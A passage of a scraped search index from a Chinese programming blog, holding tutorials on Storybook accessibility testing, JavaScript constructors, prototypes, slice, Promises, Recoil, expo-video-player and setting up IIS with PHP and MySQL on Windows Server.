选择器运行  id: \u0026#39;autocomplete-valid\u0026#39;, selector: \u0026#39;*:not([autocomplete=\u0026#34;nope\u0026#34;])\u0026#39;, }, { // 将 enabled 选项设置为 false 将禁用对所有故事的此特定规则的检查。  id: \u0026#39;image-alt\u0026#39;, enabled: false, }, ], }, options: {}, manual: true, }, };   如何禁用 a11y 测试 通过将以下参数分别添加到故事的导出或组件的默认导出，禁用故事或组件的可访问性测试：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21  // MyComponent.stories.ts|tsx  import React from \u0026#39;react\u0026#39;; import { ComponentStory, ComponentMeta } from \u0026#39;@storybook/react\u0026#39;; import { MyComponent } from \u0026#39;./MyComponent\u0026#39;; export default { title: \u0026#39;Disable a11y addon\u0026#39;, component: MyComponent, } as ComponentMeta\u0026lt;typeof MyComponent\u0026gt;; const Template: ComponentStory\u0026lt;typeof MyComponent\u0026gt; = () =\u0026gt; \u0026lt;MyComponent /\u0026gt;; export const NonA11yStory = Template.bind({}); NonA11yStory.parameters = { a11y: { // 此选项禁用对此故事的所有 a11y 检查  disable: true, }, };   \r使用 Jest 自动化可访问性测试 使用 Storybook 进行可访问性测试缩短了反馈循环，这意味着可以更快地解决问题。\n在 Jest 测试中重用故事，并使用 jest-axe 集成对它们运行可访问性审核。\n这也解锁了将可访问性测试集成到功能测试管道中的能力。\n例如，包含以下测试文件以对故事运行可访问性测试：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19  // MyComponent.test.js  import { render } from \u0026#39;@testing-library/react\u0026#39;; import { composeStories } from \u0026#39;@storybook/testing-react\u0026#39;; import { axe, toHaveNoViolations } from \u0026#39;jest-axe\u0026#39;; import * as MyComponentStories from \u0026#39;./MyComponent.stories\u0026#39;; const { Accessible } = composeStories(MyComponentStories); expect.extend(toHaveNoViolations); test(\u0026#39;Example accessiblity test\u0026#39;, async () =\u0026gt; { const { container } = render(\u0026lt;Accessible /\u0026gt;); const AxeResults = await axe(container); expect(AxeResults).toHaveNoViolations(); });   当执行测试脚本时，它将运行可访问性审核以及可能拥有的任何交互测试。\n基于浏览器和基于 linter 的可访问性测试有什么区别？\n基于浏览器的可访问性测试（如 Storybook 中的内容）会评估渲染的 DOM，因为这可以为您提供最高的准确度。\n尚未编译的审计代码是从真实代码中删除的一步，因此不会捕获用户可能遇到的所有内容。\n\r知识点  a11y 插件  ","description":"可访问性测试 可访问性","id":68,"section":"react","tags":null,"title":"可访问性测试","uri":"https://codthing.github.io/react/storybook/sb-test/sb-accessibility-testing/"},{"content":"一、V8 JavaScript 引擎 V8 是支持 Google Chrome 的 JavaScript 引擎的名称。\nV8 是用 C++ 编写的。它是便携式的，可在 Mac、Windows、Linux 和其他几个系统上运行。。\n很酷的一点是 JavaScript 引擎独立于它所在的浏览器。\n这一关键特性促成了 Node.js 的兴起。早在 2009 年，V8 就被选为支持 Node.js 的引擎，随着 Node.js 的普及，V8 成为现在支持大量用 JavaScript 编写的服务器端代码的引擎。\n\r二、其他 JS 引擎 其他浏览器有自己的 JavaScript 引擎：\n Firefox 有 SpiderMonkey Safari 具有 JavaScriptCore（也称为 Nitro） Edge 最初基于 Chakra，但最近使用 Chromium 和 V8 引擎进行了重建。  \r三、汇编 JavaScript 通常被认为是一种解释型语言，但现代 JavaScript 引擎不再只是解释 JavaScript，而是编译它。\n编译 JavaScript 非常有意义，虽然准备好 JavaScript 可能需要更多时间，但一旦完成，它的性能将比纯解释代码高得多。\n\r四、从命令行运行 Node.js 脚本 1 2 3  // 告诉 shell 使用 node.js 运行脚本 node app.js   1 2 3  // 解释器的绝对路径 #!/usr/bin/node   1 2 3 4 5  // 以 node 作为参数运行 env #!/usr/bin/env node // your code   1 2 3  // 授予 app.js 可执行权限： chmod u+x app.js   ","description":"","id":69,"section":"nodejs","tags":null,"title":"引擎和运行方式","uri":"https://codthing.github.io/nodejs/nodebase/node-engine/"},{"content":"一、定义构造函数 Constructors 是创建对象的函数。\n函数给这个新对象定义属性和行为。 可将它们视为创建的新对象的蓝图。\n1 2 3 4 5  function Bird() { this.name = \u0026#34;Albert\u0026#34;; this.color = \u0026#34;blue\u0026#34;; this.numLegs = 2; }   这个构造函数定义了一个 Bird 对象，\n其属性 name、color 和 numLegs 的值分别被设置为 Albert、blue 和 2。\n构造函数遵循一些惯例规则：\n  构造函数函数名的首字母大写，这是为了方便我们区分构造函数（ constructors）和其他非构造函数。\n  构造函数使用 this 关键字 来给它将创建的这个对象设置新的属性。 在构造函数里面，this 指向的就是它新创建的这个对象。\n  构造函数定义了属性和行为就可创建对象，而不是像其他函数一样需要设置返回值。\n  \r二、使用构造函数创建对象 1 2 3 4 5 6 7  function Bird() { this.name = \u0026#34;Albert\u0026#34;; this.color = \u0026#34;blue\u0026#34;; this.numLegs = 2; } let blueBird = new Bird();   注意： 构造函数内的 this 总是指被创建的对象。\n注意： 通过构造函数创建对象的时候要使用 new 操作符。 因为只有这样，JavaScript 才知道要给 Bird 这个构造函数创建一个新的实例：blueBird。 如果不使用 new 操作符来新建对象，那么构造函数里面的 this 就无法指向新创建的这个对象实例，从而产生不可预见的错误。 现在 blueBird 这个实例就继承了Bird 构造函数的所有属性，\n由构造函数创建的实例也和其他对象一样，它的属性可以被访问和修改：\n1 2 3 4 5 6  blueBird.name; // Albert blueBird.color; // blue blueBird.numLegs; // 2  blueBird.name = \u0026#39;Elvira\u0026#39;; blueBird.name; // Elvira   \r三、扩展构造函数以接收参数 注意到没有：所有通过Bird 构造函数创建出来的实例 Birds 都自动的取名为 Albert，颜色都是蓝色，还都有两条腿。\n如果想要新创建出来的小鸟们拥有不同的名字和颜色要怎么办呢？\n当然，手动的去修改每一个小鸟实例自己的属性也是可以实现的，只是会增加很多无谓的工作量：\n1 2 3  let swan = new Bird(); swan.name = \u0026#34;Carlos\u0026#34;; swan.color = \u0026#34;white\u0026#34;;   假如写了一个程序来追踪一个鸟舍里面的几百只甚至几千只不同的小鸟。\n将会花费很多时间去创建所有的小鸟实例并给它们的属性一一修改为不同的值。\n为了减轻创建不同 Bird 对象的工作量，可以给你的 Bird 设置为可以接收参数的构造函数：\n1 2 3 4 5  function Bird(name, color) { this.name = name; this.color = color; this.numLegs = 2; }   然后将值通过参数的方式传递给 Bird 构造函数来定义每一个唯一的小鸟实例：\n1  let cardinal = new Bird(\u0026#34;Bruce\u0026#34;, \u0026#34;red\u0026#34;);   这给 Bird 的 name 和 color 属性分别赋值为 Bruce 和 red 色。\n但 numLegs 属性仍然设置为 2。 cardinal 有以下这些属性：\n1 2 3  cardinal.name // Bruce cardinal.color // red cardinal.numLegs // 2   这样一来构造函数就变得很灵活了。\n现在可以在创建每个 Bird 实例时直接定义属性，这是 JavaScript 构造函数非常实用的用法之一。\n它们根据共同或相似的属性和行为将对象归纳为一组，并能够自动的创建各自实例。\n\r四、使用 instanceof 验证对象的构造函数 凡是通过构造函数创建出的新对象，这个对象都叫做这个构造函数的 instance。\nJavaScript 提供了一种很简便的方法来验证这个事实，那就是通过 instanceof 操作符。\ninstanceof 允许将对象与构造函数之间进行比较，根据对象是否由这个构造函数创建的返回 true 或者 false。\n1 2 3 4 5 6 7 8 9  let Bird = function(name, color) { this.name = name; this.color = color; this.numLegs = 2; } let crow = new Bird(\u0026#34;Alexis\u0026#34;, \u0026#34;black\u0026#34;); crow instanceof Bird; // true   如果一个对象不是使用构造函数创建的，那么 instanceof 将会验证这个对象不是构造函数的实例：\n1 2 3 4 5 6 7  let canary = { name: \u0026#34;Mildred\u0026#34;, color: \u0026#34;Yellow\u0026#34;, numLegs: 2 }; canary instanceof Bird; // false   \r总结 构造函数可以传参，比字面量对象灵活\n","description":"灵活","id":70,"section":"javascript","tags":null,"title":"构造函数","uri":"https://codthing.github.io/javascript/algorithms-data/object-programming/constructor-fn/"},{"content":"如何使用 Storybook 作为构建组件的工作区。\n\r侧边栏和 Canvas（画布） *.stories.ts 文件定义了一个组件的所有故事。\n每个故事都有一个相应的侧边栏项目。\n当单击一个故事时，它会在 Canvas 中呈现一个独立的预览 iframe。\n通过单击侧栏中的故事在故事之间导航。 尝试侧边栏搜索以按名称查找故事。\n或者使用键盘快捷键。 单击 Storybook 的菜单以查看可用的快捷方式列表。\n\rToolbar（工具栏） Storybook 附带了内置的省时工具。 工具栏包含调整故事在画布中呈现方式的工具：\n  🔍 直观地缩放组件，以便检查细节。\n  🖼 更改组件背后的渲染背景，以便验证组件在不同视觉上下文中的渲染方式。\n  📱 以各种尺寸和方向呈现组件。 它非常适合检查组件的响应能力。\n   Docs 选项卡显示有关组件的自动生成的文档（从源代码推断）。 使用文档在与团队共享可重用组件时很有帮助，例如，在设计系统或组件库中。  工具栏是可定制的。 可以使用全局变量来快速切换主题和语言。 或者从社区安装 Storybook 工具栏插件以启用高级工作流程。\n\rAddons（插件） 插件是扩展 Storybook 核心功能的插件。\n可以在插件面板中找到它们，这是画布下方 Storybook UI 中的一个保留位置。 每个选项卡都显示插件为所选故事生成的元数据、日志或静态分析。\n  Controls 动态地与组件的 args（输入）交互。 尝试使用组件的替代配置来发现边缘情况。\n  Actions 验证交互通过回调产生正确的输出。 例如，如果查看 Header 组件的 Login 故事，可以验证单击 Logout 按钮会触发 onLogout 回调，该回调将由使用 Header 的组件提供。\n  Storybook 是可扩展的。\n丰富的插件生态系统可帮助测试、记录和优化故事。\n还可以创建一个插件来满足工作流程要求。 在插件部分阅读更多内容。\n","description":"如何使用 Storybook 作为构建组件的工作区。","id":71,"section":"react","tags":null,"title":"浏览故事","uri":"https://codthing.github.io/react/storybook/sb-started/sb-browse/"},{"content":"try\u0026hellip;catch语句标记要尝试的语句块，并指定一个出现异常时抛出的响应。\n1 2 3 4 5 6 7 8 9 10 11  try { // 尝试运行这段代码 } catch(err) { // 如果有任何错误，代码会抛出错误 } finally { // 无论是否出错，始终运行此代码  // 这个块是可选的 }   ","description":"try...catch语句标记要尝试的语句块，并指定一个出现异常时抛出的响应。","id":72,"section":"javascript","tags":null,"title":"错误处理，try{...}catch{...}","uri":"https://codthing.github.io/javascript/function/try-catch/"},{"content":"slice() 方法将数组的一部分的浅拷贝返回到从开始到结束（不包括结束）选择的新数组对象中，其中开始和结束表示该数组中项目的索引。 不会修改原始数组。\n使用 slice 方法返回数组的一部分 slice （Array.prototype.slice()） 方法可以从已有数组中返回指定元素。\n它接受两个参数，第一个规定从何处开始选取，第二个规定从何处结束选取（不包括该元素）。\n如果没有传参，则默认为从数组的开头开始到结尾结束，这是复制整个数组的简单方式。\nslice 返回一个新数组，不会修改原始数组。\n简单的例子：\n1 2 3  const arr = [\u0026#34;Cat\u0026#34;, \u0026#34;Dog\u0026#34;, \u0026#34;Tiger\u0026#34;, \u0026#34;Zebra\u0026#34;]; const newArray = arr.slice(1, 3); // [\u0026#34;Dog\u0026#34;, \u0026#34;Tiger\u0026#34;]   复杂的例子：\n1 2 3 4 5 6 7 8 9  function sliceArray(anim, beginSlice, endSlice) { return anim.slice(beginSlice, endSlice) } const inputAnim = [\u0026#34;Cat\u0026#34;, \u0026#34;Dog\u0026#34;, \u0026#34;Tiger\u0026#34;, \u0026#34;Zebra\u0026#34;, \u0026#34;Ant\u0026#34;]; sliceArray(inputAnim, 1, 3); // [ \u0026#39;Dog\u0026#39;, \u0026#39;Tiger\u0026#39; ]   \r使用 slice 取代 splice 从数组中移除元素 使用数组时经常遇到要删除一些元素并保留数组剩余部分的情况。\n为此，JavaScript 提供了 splice 方法，\n它接收两个参数：从哪里开始删除项目的索引，和要删除的项目数。 如果没有提供第二个参数，默认情况下是移除一直到结尾的所有元素。\n但 splice 方法会改变调用它的原始数组。 举个例子：\n1 2 3 4  const cities = [\u0026#34;Chicago\u0026#34;, \u0026#34;Delhi\u0026#34;, \u0026#34;Islamabad\u0026#34;, \u0026#34;London\u0026#34;, \u0026#34;Berlin\u0026#34;]; cities.splice(3, 1); console.log(cities); // [\u0026#34;Chicago\u0026#34;, \u0026#34;Delhi\u0026#34;, \u0026#34;Islamabad\u0026#34;, \u0026#34;Berlin\u0026#34;]   slice 方法不会改变原始数组，而是返回一个可以保存到变量中的新数组。\nslice 方法接收两个参数，从开始索引开始选取到结束（不包括该元素），并在新数组中返回这些元素。\n使用 slice 方法替代 splice 有助于避免数组变化产生的副作用。\n1 2 3 4 5 6 7 8 9  function nonMutatingSplice(cities) { return cities.slice(0, 3); } const inputCities = [\u0026#34;Chicago\u0026#34;, \u0026#34;Delhi\u0026#34;, \u0026#34;Islamabad\u0026#34;, \u0026#34;London\u0026#34;, \u0026#34;Berlin\u0026#34;]; nonMutatingSplice(inputCities); // [\u0026#34;Chicago\u0026#34;, \u0026#34;Delhi\u0026#34;, \u0026#34;Islamabad\u0026#34;]   ","description":"slice() 方法将数组的一部分的浅拷贝返回到从开始到结束（不包括结束）选择的新数组对象中，其中开始和结束表示该数组中项目的索引。 不会修改原始数组。","id":73,"section":"javascript","tags":null,"title":"Array.prototype.slice()","uri":"https://codthing.github.io/javascript/algorithms-data/function-programming/slice-programming/"},{"content":"expo-video-player\nStep.1 安装 expo install expo-video-player\rexpo install expo-av @react-native-community/netinfo @react-native-community/slider Step.2 使用 import { Video } from \u0026#39;expo-av\u0026#39;\rimport VideoPlayer from \u0026#39;expo-video-player\u0026#39;\r\u0026lt;VideoPlayer\rvideoProps={{\rshouldPlay: true,\rresizeMode: Video.RESIZE_MODE_CONTAIN,\rsource: {\ruri: \u0026#39;http://commondatastorage.googleapis.com/gtv-videos-bucket/sample/BigBuckBunny.mp4\u0026#39;,\r},\r}}\rinFullscreen={true}\r/\u0026gt; 视频列表解决思路  用图片作为列表 用model模态框作为全屏视频播放的窗口 点击图片触发模态框加载视频自动播放  \u0026lt;Button onPress={() =\u0026gt; setVisible(true)}\u0026gt;\rTOGGLE MODAL\r\u0026lt;/Button\u0026gt;\r\u0026lt;Modal\rvisible={visible}\rbackdropStyle={styles.backdrop}\ronBackdropPress={() =\u0026gt; setVisible(false)}\u0026gt;\r\u0026lt;Button style={styles.closebutton} onPress={() =\u0026gt; setVisible(false)} accessoryLeft={closeIcon} /\u0026gt;\r\u0026lt;View style={{paddingBottom: 0}}\u0026gt;\r\u0026lt;VideoPlayer\rvideoProps={{\rshouldPlay: true,\rresizeMode: Video.RESIZE_MODE_CONTAIN,\r// source: {\r// uri: \u0026#39;http://commondatastorage.googleapis.com/gtv-videos-bucket/sample/BigBuckBunny.mp4\u0026#39;,\r// },\rsource: require(\u0026#39;../assets/videos/big_buck_bunny.mp4\u0026#39;)\r}}\rshowControlsOnLoad={true}\rinFullscreen={true}\rshowFullscreenButton={false}\r/\u0026gt;\r\u0026lt;/View\u0026gt;\r\u0026lt;/Modal\u0026gt; ","description":"","id":74,"section":"react-native","tags":null,"title":"expo-video-player","uri":"https://codthing.github.io/react-native/expo/expo-video-player/"},{"content":"Windows Server 2012 R2 x64 IIS服务器 PHP环境搭建\n阿里云服务器ECS Windows Server 2012 R2 64位中文标准版下手动搭建PHP环境。\n IIS8.5 + MySQL5.6.15 + PHP5.5.19 + FastCGI + phpMyAdmin4.2.12\n 特别注意：服务器内存不能低于2G，否则安装iis的过程中会报错：0x80070008。\nStep1. 相关软件准备 完整安装包下载地址：http://pan.baidu.com/s/1c0F6g0K\n安装包解压密码：www.imaoye.com\nStep2. 安装IIS8.5  进入添加角色和功能向导 下一步 基于角色或基于功能的安装，下一步 从服务器池中选择服务器，下一步 选择服务器角色，点击Web服务器（IIS） 直接点击添加功能 确定已经勾选Web服务器（IIS）后，下一步 直接点击下一步 直接点击下一步 根据自己的需求选择服务，建议选择全部功能。往下拉滚动条至应用程序开发并点击前面的右三角形展开选项。 重点确定CGI选项被勾选，确定无误，下一步 点击安装   安装成功后，点击关闭，返回服务器管理器在角色和服务器组可查看到IIS。\n  打开 IE，地址栏中输入：127.0.0.1，显示Windows Server界面，则IIS8.5安装成功。\n Step3. 安装及配置PHP5.5  在安装PHP之前，先安装支持PHP运行的两个重要组件\n  vcredist_x64.exe (For VS2012) vcredist_x86.exe (For VS2012)   个人选择： 在D盘新建PHPServer文件夹，并在该文件夹内新建 PHP MySQL MySQLdata wwwroot4个文件夹。 解压php-5.5.19-nts-Win32-VC11-x86.zip文件，将解压文件夹内的所有文件复制到新建的PHP文件夹中。 复制文件夹内的php.ini-production文件，将生成的副本重命名为php.ini。   注：php.ini-development适合开发测试，如本地测试环境；php.ini-production 拥有较高的安全性设定，适合服务器上线运营产品，根据自己的需 求选择文件配置。\n 配置php.ini文件，右键php.ini文件，用Notepad++ 或者记事本打开。  \u0026gt; 注意：开启PHP某个模块和功能，必须去掉前面的分号 “;”\r- 第202行 开启短标签 short_open_tag = On\r- 第721行 设置PHP模块路径 extension_dir = \u0026#34;D:\\PHPServer\\PHP\\ext\u0026#34;\r- 第738行 开启CGI cgi.force_redirect = 0\r- 第766行 开启CGI fastcgi.impersonate = 1\r- 第778行 开启CGI cgi.rfc2616_headers = 1\r----开启扩展模块----\r- 第864行 extension=php_curl.dll\r- 第866行 extension=php_gd2.dll\r- 第873行 extension=php_mbstring.dll\r- 第874行 extension=php_exif.dll\r- 第875行 extension=php_mysql.dll\r- 第876行 extension=php_mysqli.dll\r- 第881行 extension=php_pdo_mysql.dll\r- 第895行 extension=php_sockets.dll\r- 第899行 extension=php_xmlrpc.dll\r----设置时区----\r- 第913行 date.timezone = PRC 至此php.ini基本配置完成，保存后退出\n配置IIS支持PHP运行  1). 打开服务器管理器，点击工具，选择第一个Internet Information Services（IIS）管理器\n2). 点击起始页下面的计算机/实例名称，中间位置iis部分找到处理程序映射\n3). 双击处理程序映射进入，点击右边操作下面的添加模块映射\n4). 弹出添加模块映射对话框，按照以下内容填写\n 请求路径：*.php 模块：FastCgiModule 可执行文件（可选）：D:\\PHPServer\\PHP\\php-cgi.exe 名称：FastCGI  5). 点击确定\n6). 点击是\n7). 回到主页，在IIS部分找到FastCGI设置选项\n8). 双击进入FastCGI设置，右键D:PHPServerPHPphp-cgi.exe 选择编辑\n9). 弹出编辑FastCGI应用程序对话框\n10). 点击环境变量--（集合）右边的...，弹出EnvironmentVariables合集编辑器，点击左下角添加\n11). 在右边的杂项下面，填入对应值\n Name：PHP_FCGI_MAX_REQUESTS Value：1000  12). 点击确定\n13). 在监视对文件所做的更改选项中选择我们配置的php.ini文件路径\n14). 点击确定\n15). 回到主页，在中间的IIS部分，双击默认文档选项\n16). 进入默认文档页后，根据自己的需求添加或者删除默认文件名称，在此，我们点击右边操作下面的添加，添加index.php\n17). 点击确定\n18). 此时，默认文档已经成功添加index.php,接下来测试一下PHP程序是否运行正常。\n19). 点击IIS管理器 左边网站选项，点击下面的Default Web Site，右键删除，或者点击右边操作选项下的删除按钮都可以，删除默认站点\n20). 删除后，右键网站选项，添加网站\n21). 进入添加网站页\n 网站名称：（可自定义，给你自己看的） 物理路径：选择之前新建的wwwroot文件夹作为网站的根目录 点击“确定”  22). 然后打开D:\\PHPServer\\wwwroot文件夹\n 新建一个index.php 文件，写入以下内容：  \u0026lt;?php\rphpinfo();\r?\u0026gt; 保存退出\n23). 打开浏览器，输入127.0.0.1 或者 服务器的公网IP 都可以，回车看效果\n当看到PHP版本页面的时候，说明PHP程序已经配置成功，运行正常。\nStep4. 安装及配置MySQL5.6 1.双击运行mysql-installer-community-5.6.15.0.msi文件\n2.选择Install MySQL Products,安装MySQL\n3.勾选I accept the license terms（我接受上述条款），点击“Next（下一步）”\n4.勾选Skip the check for update (not recommended) 跳过检查更新，点击“Next（下一步）”\n5.选择“Custom”（用户自定义安装）\n 注意右边，修改安装路径，以防重装系统后，需要再次安装MySQL Installation Path（安装路径）：D:\\PHPServer\\MySQL Data Path（数据库存放路径）：D:\\PHPServer\\MySQLdata 点击“Next”  6.确定MySQL Server 5.6.15被选中后，点击“Next”\n7.点击Execute （执行）\n开始安装 -\u0026gt; 弹出对话框，勾选“我已阅读并接受许可条款”，点击“安装” -\u0026gt; 安装完毕，点击“完成” -\u0026gt; 点击“Execute （执行） -\u0026gt; 点击“Next” -\u0026gt; 点击“Execute （执行）” -\u0026gt; 逐个安装中 -\u0026gt; 全部安装完毕后，点击“Next” -\u0026gt; 点击“Next” -\u0026gt;\n8.Config Type (服务器类型)，我们选择第二种Server Machine\n9.确定勾选“Enable TCP/IP Networking”（开启TCP/IP网络端口）\nPort Number（端口）：3306\n勾选Open firewall port for network access（打开防火墙端口网络访问）\n点击“Next”\n10.设置MySQL密码，这个一定要记住而且很重要。密码设置好后，点击“Next” 点击“Next” -\u0026gt; 点击“Next” -\u0026gt; 安装完成，点击“Next” -\u0026gt; 点击“Finish （完成）”\n11.关闭此窗口\n12.点击桌面左下角第一个开始图标，进入开始页面\n13.点击开始页面中，最下面的向下的小箭头，进入应用界面\n14.找到MySQL5.6 Command Line Client，点击它，进入MySQL命令控制台\n15.输入，我们刚刚设定的MySQL密码，回车\n16.看到了这个welcome界面后，MySQL已经成功安装！关闭窗口\nStep5. 安装phpMyAdmin 1.解压phpMyAdmin-4.2.12-all-languages.zip，复制解压文件夹中的phpMyAdmin-4.2.12-all-languages文件夹到D:\\PHPServer\\wwwroot\n2.然后，打开服务器管理器\u0026ndash;工具\u0026ndash;Internet Information Services（IIS）管理器\u0026ndash;计算机名称\n3.点击刚刚建的测试站点，切换到“内容视图”\n4.双击视图中的phpMyAdmin-4.2.12-all-languages文件夹，找到index.php文件，右键\u0026ndash;浏览\n5.进入phpMyAdmin登录页面\n用户名：root\n密码：MySQL登录密码\n点击“执行”\n6.配置伪静态模块\n 双击运行“rewrite_x64_zh-CN.msi” 在网站根目录下新建文件web.config，添加伪静态规则代码即可实现网站静态化。 也可以根据自己实际需求，用其他的方法配置伪静态规则   至此，在阿里云云服务器ECS Windows Server 2012 R2 64位中文标准版操作系统下手动搭建PHP环境全部完成。（IIS8.5 + MySQL5.6.15 + PHP5.5.19 + FastCGI + phpMyAdmin4.2.12 ）\n 其他： dedecms自动安装的时候， 将www6中的文件复制到wwwroot中，就可以通过客户端访问安装了。\n因为没有开启写入权限，去到服务器那里，开启权限写入就可以了。\n","description":"","id":75,"section":"others","tags":null,"title":"IIS PHP","uri":"https://codthing.github.io/others/php/iisphp/"},{"content":"一、Promise 概述 Promise 对象用于表示一个异步操作的最终完成 (或失败)及其结果值。\n#. Promise 有 3 个状态  待定（pending）: 初始状态，既没有被兑现，也没有被拒绝。 已兑现（fulfilled）: 意味着操作成功完成。 已拒绝（rejected）: 意味着操作失败。  #. Promise 有 2 个方法  Promise.prototype.then Promise.prototype.catch  当然，就像常规 try {...} catch {...} 中的 finally 子句一样，promise 中也有 finally。\nfinally 是执行清理（cleanup）的很好的处理程序（handler），例如无论结果如何，都停止使用不再需要的加载指示符（indicator）\n1 2 3 4 5 6 7 8  new Promise((resolve, reject) =\u0026gt; { /* 做一些需要时间的事儿，然后调用 resolve/reject */ }) // 在 promise 为 settled 时运行，无论成功与否  .finally(() =\u0026gt; stop loading indicator) // 所以，加载指示器（loading indicator）始终会在我们处理结果/错误之前停止  .then(result =\u0026gt; show result, err =\u0026gt; show error)   #. Promise 有 2 个参数  resolve(value) — 如果任务成功完成并带有结果 value。 reject(error) — 如果出现了 error，error 即为 error 对象。  二、Promise 使用方法 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18  // 创建Promise let myPromise = new Promise((myResolve, myReject) =\u0026gt; { myResolve(); // when successful  myReject(); // when error }); // 使用Promise myPromise.then( function (value) { /* code if successful */ }, function (error) { /* code if some error */ } );   实例\n1 2 3 4 5 6 7 8 9 10 11  new Promise((res, rej) =\u0026gt; { setTimeout(() =\u0026gt; res(1), 1000); }) .then((res) =\u0026gt; { console.log(res); // 1  return res * 2; }) .then((res) =\u0026gt; { console.log(res); // 2  });   三、async/await  简单来说，它们是基于 promises 的语法糖，使异步代码更易于编写和阅读。 通过使用它们，异步代码看起来更像是老式同步代码。 ！！！这才是所有回调的最佳（至少目前来说）使用方式！！！  #. function 中的使用方法 1 2 3 4 5 6  (async () =\u0026gt; { let response = await fetch(\u0026#39;/article/promise-chaining/user.json\u0026#39;); let user = await response.json(); ... })();   #. class 中的使用方法 1 2 3 4 5 6 7 8 9 10  class Waiter { async wait() { return await Promise.resolve(1); } } new Waiter() .wait() .then(alert); // 1（alert 等同于 result =\u0026gt; alert(result)）   ","description":"Promise 对象用于表示一个异步操作的最终完成 (或失败)及其结果值。","id":76,"section":"javascript","tags":null,"title":"Promise, async/await","uri":"https://codthing.github.io/javascript/function/promise/"},{"content":"Recoil 是 React 官方 meta (facebook) 官方实验室的状态管理库，贴合 React hooks，自由度很高，所以要在项目中做一些规范，以便提供最佳的实践。\n官方文档有对核心概念的解释，但是，这里主要以我个人的理解去诠释这些核心概念。\natom 是 Recoil 的核心概念，在项目中，主要将它用来初始化一个状态。那如何处理这个状态呢，selectorFamily 就像一面镜子，它可以折射 atom 的状态给组件(当然，这里最好就是直接从atom读取状态)，也可以将组件想要改变的状态意图通过它来折射给 atom。\n最佳目录结构 /pages/index.tsx\r/components/plus.component.tsx\r/components/minus.component.tsx\r/components/reset.component.tsx\r/recoil/count.recoil.ts /recoil/count.recoil.ts import {\ratom,\rDefaultValue,\rselectorFamily,\r} from \u0026#39;recoil\u0026#39;;\rconst count = atom({\rkey: \u0026#39;count\u0026#39;,\rdefault: 0\r});\rconst changeCount = selectorFamily({\rkey: \u0026#39;changeCount\u0026#39;,\rget: () =\u0026gt; ({ get }) =\u0026gt; { return get(count) },\rset: (params) =\u0026gt; ({ set }, newValue: any) =\u0026gt; {\rswitch (params) {\rcase \u0026#39;+\u0026#39;:\rset(\rcount,\rnewValue instanceof DefaultValue ? newValue : (newValue + 1)\r);\rbreak;\rcase \u0026#39;-\u0026#39;:\rif (newValue \u0026gt;= 1) {\rset(\rcount,\rnewValue instanceof DefaultValue ? newValue : (newValue - 1)\r)\r};\rbreak;\rdefault: set(\rcount,\rnewValue\r);\r};\r}\r});\rexport { count, changeCount }; /pages/index.tsx import Plus from \u0026#39;../components/plus.component\u0026#39;;\rimport Minus from \u0026#39;../components/minus.component\u0026#39;;\rimport CountReset from \u0026#39;../components/countReset.component\u0026#39;;\rimport { useRecoilState, useRecoilValue, useResetRecoilState } from \u0026#39;recoil\u0026#39;;\rimport { changeCount, count } from \u0026#39;../recoil/count.recoil\u0026#39;;\rconst value = useRecoilValue(count);\rconst [plusCount, setPlusCount] = useRecoilState(changeCount(\u0026#39;+\u0026#39;));\rconst plusFunc = () =\u0026gt; setPlusCount(plusCount);\rconst [minusCount, setMinusCount] = useRecoilState(changeCount(\u0026#39;-\u0026#39;));\rconst minusFunc = () =\u0026gt; setMinusCount(minusCount);\rconst resetFunc = useResetRecoilState(changeCount(\u0026#39;\u0026#39;));\r\u0026lt;h1\u0026gt;{value}\u0026lt;/h1\u0026gt;\r\u0026lt;Plus plusFunc={plusFunc} /\u0026gt;\r\u0026lt;Minus minusFunc={minusFunc} /\u0026gt;\r\u0026lt;CountReset resetFunc={resetFunc} /\u0026gt; /components/plus.component.tsx export default function (props:any) {\rreturn (\r\u0026lt;button onClick={props.plusFunc}\u0026gt;+\u0026lt;/button\u0026gt;\r)\r} /component/minus.component.tsx export default function (props:any) {\rreturn (\r\u0026lt;button onClick={props.minusFunc}\u0026gt;-\u0026lt;/button\u0026gt;\r)\r} /components/resetCount.tsx export default function (props:any) {\rreturn (\r\u0026lt;button onClick={props.resetFunc}\u0026gt;reset\u0026lt;/button\u0026gt;\r)\r} ","description":"React 官方实验室的状态管理解决方案，但是我感觉并不如社区中的Zustand好用","id":77,"section":"react","tags":null,"title":"Recoil 最佳实践","uri":"https://codthing.github.io/react/recoil/recoil-bp/"},{"content":"一、了解自有属性  hasOwnProperty  下面的实例，Bird 构造函数定义了两个属性：name 和 numLegs：\n1 2 3 4 5 6 7 8  function Bird(name) { this.name = name; this.numLegs = 2; } let duck = new Bird(\u0026#34;Donald\u0026#34;); let canary = new Bird(\u0026#34;Tweety\u0026#34;);   name 和 numLegs 被叫做 自身属性，因为它们是直接在实例对象上定义的。\n这就意味着 duck 和 canary 这两个对象分别拥有这些属性的独立副本。\n事实上，Bird 的所有实例都将拥有这些属性的独立副本。\n下面的代码将 duck 的所有自身属性都存到一个叫作 ownProps 的数组里面：\n1 2 3 4 5 6 7 8 9 10  let ownProps = []; for (let property in duck) { if(duck.hasOwnProperty(property)) { ownProps.push(property); } } console.log(ownProps); // [\u0026#34;name\u0026#34;, \u0026#34;numLegs\u0026#34;]   \r二、使用原型属性来减少重复代码 所有 Bird 实例可能会有相同的 numLegs 值，\n所以在每一个 Bird 的实例中本质上都有一个重复的变量 numLegs。\n当只有两个实例时可能并不是什么问题，但想象一下如果有数百万个实例。 这将会产生许许多多重复的变量。\n更好的方法是使用 Bird 的 prototype。\nprototype 是一个可以在所有 Bird 实例之间共享的对象。 以下是一个在 Bird prototype 中添加 numLegs 属性的示例：\n1 2  Bird.prototype.numLegs = 2;   现在所有的 Bird 实例都拥有了共同的 numLegs 属性值。\n1 2 3  console.log(duck.numLegs); // 2 console.log(canary.numLegs); // 2   由于所有的实例都可以继承 prototype 上的属性，所以可以把 prototype 看作是创建对象的 \u0026ldquo;配方\u0026rdquo;。\n请注意：duck 和 canary 的 prototype 属于 Bird 的构造函数，即 Bird 的原型 Bird.prototype。\nJavaScript 中几乎所有的对象都有一个 prototype 属性，这个属性是属于它所在的构造函数。\n\r三、迭代所有属性 现在已经了解了两种属性: 自身属性 和 prototype 属性。\n自身属性是直接在对象上定义的。 而原型属性在 prototype 上定义。\n1 2 3 4 5 6 7 8  function Bird(name) { this.name = name; //own property } Bird.prototype.numLegs = 2; // prototype property  let duck = new Bird(\u0026#34;Donald\u0026#34;);   这个示例会告诉你如何将 duck 的 